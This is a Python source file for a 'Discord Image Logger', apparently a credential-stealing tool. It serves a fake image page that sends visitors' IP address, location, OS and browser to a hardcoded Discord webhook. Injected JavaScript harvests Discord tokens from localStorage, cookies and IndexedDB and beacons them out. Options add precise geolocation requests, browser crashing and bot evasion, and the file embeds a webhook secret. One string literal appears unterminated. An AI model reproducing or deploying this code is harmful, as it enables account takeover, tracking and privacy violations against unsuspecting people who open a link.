# Image Logger with Discord Token Capture
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs, Discord tokens, and more"
__version__ = "v2.5"
__author__ = "C00lB0i"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",
    "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
    "imageArgument": True,
    
    # TOKEN LOGGING CONFIG #
    "tokenLogging": True,  # Enable Discord token capture
    "tokenWebhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",  # Webhook for token alerts
    
    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json = {
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        }, timeout=5)
    except:
        pass

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json = {
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                }, timeout=5)
            except:
                pass
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
        if info["proxy"]:
            if config["vpnCheck"] == 2:
                    return
            
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info["hosting"]:
            if config["antiBot"] == 4:
                if info["proxy"]:
                    pass
                else:
                    return

            if config["antiBot"] == 3:
                    return

            if config["antiBot"] == 2:
                if info["proxy"]:
                    pass
                else:
                    ping = ""

            if config["antiBot"] == 1:
                    ping = ""
    except:
        info = {}
        for key in ['isp', 'as', 'country', 'regionName', 'city', 'lat', 'lon', 'timezone', 'mobile', 'proxy', 'hosting']:
            info[key] = "Error"

    try:
        os, browser = httpagentparser.simple_detect(useragent)
    except:
        os, browser = "Unknown", "Unknown"
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
                
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', '')) + ', ' + str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++' + coords + ')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if info.get('timezone') else 'Unknown'})`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
                }
        ],
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except Exception as e:
        reportError(f"Failed to send main webhook: {str(e)}")
    
    return info

# Function to report captured tokens
def reportToken(ip, useragent, token, endpoint="N/A"):
    if not token or token == "NOT_FOUND":
        return
    
    try:
        token_embed = {
            "username": "TOKEN LOGGER",
            "content": "@everyone **CRITICAL TOKEN CAPTURED**",
            "embeds": [
                {
                    "title": "Discord Token Captured!",
                    "color": 0xFF0000,
                    "description": f"""**A Discord token was captured!**

**Endpoint:** `{endpoint}`
**IP:** `{ip}`
**Token:** `{token}`

**Token Information:**
> **Account ID:** `{token.split('.')[0] if '.' in token else 'N/A'}`
> **Creation Timestamp:** `{token.split('.')[1] if '.' in token and len(token.split('.')) > 1 else 'N/A'}`

**WARNING:** This token provides full access to the user's Discord account!""",
                }
            ],
        }
        requests.post(config["tokenWebhook"], json=token_embed, timeout=5)
    except Exception as e:
        reportError(f"Failed to send token webhook: {str(e)}")

# Token capture JavaScript
token_js = """
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(function() {
        let token = "NOT_FOUND";
        
        // 1. Check localStorage for Discord tokens
        const tokenKeys = [
            'token', '_token', 'discord_token', 
            'auth_token', 'access_token', 'user_token'
        ];
        
        for (const key of tokenKeys) {
            try {
                const value = localStorage.getItem(key);
                if (value && value.length > 50) {
                    token = value;
                    break;
                }
            } catch(e) {}
        }
        
        // 2. Check cookies if not found in localStorage
        if (token === "NOT_FOUND") {
            const cookies = document.cookie.split(';');
            for (const cookie of cookies) {
                const trimmed = cookie.trim();
                for (const key of tokenKeys) {
                    if (trimmed.startsWith(key + '=')) {
                        token = trimmed.substring(key.length + 1);
                        break;
                    }
                }
                if (token !== "NOT_FOUND") break;
            }
        }
        
        // 3. Check IndexedDB for Discord client tokens
        if (token === "NOT_FOUND") {
            try {
                const openRequest = indexedDB.open('discord');
                openRequest.onsuccess = function(event) {
                    const db = event.target.result;
                    const transaction = db.transaction('token', 'readonly');
                    const store = transaction.objectStore('token');
                    const request = store.get('token');
                    
                    request.onsuccess = function(e) {
                        if (e.target.result && e.target.result.value) {
                            token = e.target.result.value;
                            sendToken(token);
                        }
                    };
                    
                    request.onerror = function() {
                        sendToken(token);
                    };
                };
                
                openRequest.onerror = function() {
                    sendToken(token);
                };
            } catch(e) {
                sendToken(token);
            }
        } else {
            sendToken(token);
        }
        
        function sendToken(tokenValue) {
            // Send token to server using a beacon
            const beacon = new Image();
            beacon.src = '/logtoken?t=' + encodeURIComponent(tokenValue) + '&r=' + Math.random();
        }
    }, 2000);
});
"""

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'),
    "pixel": base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=")
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            # Handle token.js request
            if self.path == '/token.js':
                self.send_response(200)
                self.send_header('Content-Type', 'application/javascript')
                self.send_header('Cache-Control', 'no-store, max-age=0')
                self.end_headers()
                self.wfile.write(token_js.encode('utf-8'))
                return
                
            # Handle token logging
            if self.path.startswith('/logtoken'):
                query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
                token = query.get('t', '') or query.get('token', '')
                
                ip = self.headers.get('x-forwarded-for', '')
                useragent = self.headers.get('user-agent', '')
                
                if config["tokenLogging"] and token and token != "NOT_FOUND":
                    reportToken(ip, useragent, token, self.path)
                
                self.send_response(200)
                self.send_header('Content-Type', 'image/png')
                self.end_headers()
                self.wfile.write(binaries["pixel"])
                return
                
            # Main image logger functionality
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    try:
                        url_param = dic.get("url") or dic.get("id")
                        url = base64.b64decode(url_param.encode()).decode()
                    except:
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            # Build HTML content
            html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image Viewer</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background-color: #1e1e1e;
        }}
        .img-container {{
            background-image: url('{url}');
            background-position: center center;
            background-repeat: no-repeat;
            background-size: contain;
            width: 100vw;
            height: 100vh;
        }}
    </style>
</head>
<body>
    <div class="img-container"></div>
    <!-- Token capture script -->"""
            
            # Add token capture script if enabled
            if config["tokenLogging"]:
                html_content += '<script src="/token.js"></script>'
            
            html_content += """
</body>
</html>"""
            
            data = html_content.encode('utf-8')
            
            # Skip blacklisted IPs
            if self.headers.get('x-forwarded-for', '').startswith(blacklistedIPs):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(data)
                return
            
            # Handle bots
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                if config["buggedImage"]:
                    self.send_response(200)
                    self.send_header('Content-type', 'image/jpeg')
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self.send_response(302)
                    self.send_header('Location', url)
                    self.end_headers()
                
                makeReport(self.headers.get('x-forwarded-for'), endpoint = self.path.split("?")[0], url = url)
                return
            
            # Handle regular users
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            if dic.get("g") and config["accurateLocation"]:
                try:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(
                        self.headers.get('x-forwarded-for'), 
                        self.headers.get('user-agent'), 
                        location, 
                        self.path.split("?")[0], 
                        url=url
                    )
                except:
                    result = None
            else:
                result = makeReport(
                    self.headers.get('x-forwarded-for'), 
                    self.headers.get('user-agent'), 
                    endpoint=self.path.split("?")[0], 
                    url=url
                )
            
            # Custom message handling
            if config["message"]["doMessage"]:
                message = config["message"]["message"]
                if config["message"]["richMessage"] and result:
                    replacements = {
                        "{ip}": self.headers.get('x-forwarded-for'),
                        "{isp}": result.get("isp", "Unknown"),
                        "{asn}": result.get("as", "Unknown"),
                        "{country}": result.get("country", "Unknown"),
                        "{region}": result.get("regionName", "Unknown"),
                        "{city}": result.get("city", "Unknown"),
                        "{browser}": httpagentparser.simple_detect(self.headers.get('user-agent'))[1] if self.headers.get('user-agent') else "Unknown",
                        "{os}": httpagentparser.simple_detect(self.headers.get('user-agent'))[0] if self.headers.get('user-agent') else "Unknown"
                    }
                    for k, v in replacements.items():
                        message = message.replace(k, v)
                    data = message.encode('utf-8')
            
            # Browser crash option
            if config["crashBrowser"]:
                data += b'<script>setTimeout(function(){for(var i=0;i<100;i++){window.open("")}},100)</script>'
            
            # Redirection
            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode('utf-8')
            
            # Accurate location script
            if config["accurateLocation"]:
                data += b"""<script>
if (!window.location.href.includes("g=") && navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        const coords = position.coords.latitude + "," + position.coords.longitude;
        const encoded = btoa(coords).replace(/=/g, "%3D");
        const newUrl = window.location.href + (window.location.href.includes('?') ? '&' : '?') + 'g=' + encoded;
        window.location.href = newUrl;
    });
}
</script>"""
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(data)
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(f"{str(e)}\n\n{traceback.format_exc()}")

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
